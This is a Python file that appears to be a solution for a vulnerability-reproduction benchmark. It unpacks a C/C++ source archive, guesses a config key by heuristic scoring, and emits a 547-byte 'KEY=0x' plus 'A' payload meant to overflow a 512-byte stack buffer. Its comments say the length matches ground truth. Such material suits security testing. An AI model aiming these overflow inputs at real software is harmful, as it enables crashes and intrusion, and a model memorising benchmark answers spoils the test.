import os
import tarfile
import tempfile
import re
import shutil

class Solution:
    def solve(self, src_path: str) -> bytes:
        extract_dir = tempfile.mkdtemp()
        best_key = "hex_val" # Default fallback
        
        try:
            with tarfile.open(src_path) as tar:
                tar.extractall(path=extract_dir)
            
            candidates = []
            
            # Walk through source files
            for root, dirs, files in os.walk(extract_dir):
                for file in files:
                    if file.endswith(('.c', '.cpp', '.cc', '.h')):
                        path = os.path.join(root, file)
                        try:
                            with open(path, 'r', encoding='utf-8', errors='ignore') as f:
                                content = f.read()
                                
                                # Check if file has a buffer of size 512 (likely target buffer)
                                has_512 = bool(re.search(r'char\s+\w+\s*\[\s*512\s*\]', content))
                                
                                # Extract string literals that could be config keys
                                literals = re.findall(r'"([a-zA-Z0-9_=-]+)"', content)
                                for s in literals:
                                    s_clean = s.replace('=', '').replace(':', '').strip()
                                    if len(s_clean) < 2: continue
                                    # Ignore common non-key strings
                                    if s_clean.lower() in ['wb', 'rb', 'r', 'w', 'error', 'warning', 'info']:
                                        continue
                                    
                                    score = 0
                                    # Heuristics based on problem description and typical patterns
                                    if 'hex' in s_clean.lower():
                                        score += 10
                                    if 'val' in s_clean.lower():
                                        score += 3
                                    if has_512:
                                        score += 5
                                    if s.endswith('='):
                                        score += 4
                                    if 'config' in file.lower() or 'parse' in file.lower():
                                        score += 2
                                        
                                    candidates.append((score, s_clean))
                        except:
                            pass
            
            # Select best key
            if candidates:
                candidates.sort(key=lambda x: x[0], reverse=True)
                best_key = candidates[0][1]
                
        except Exception:
            pass
        finally:
            shutil.rmtree(extract_dir)
            
        # Generate PoC
        # Goal: Stack Buffer Overflow with long hex value
        # Target length matches ground truth: 547 bytes
        # Format assumed: KEY=0x...
        
        prefix = f"{best_key}=0x"
        target_len = 547
        
        padding_len = target_len - len(prefix)
        if padding_len < 0: 
            padding_len = 520 # Ensure overflow if key is unexpectedly long
            
        # Payload composed of valid hex characters 'A' (0x41)
        payload = prefix.encode() + b'A' * padding_len
        
        return payload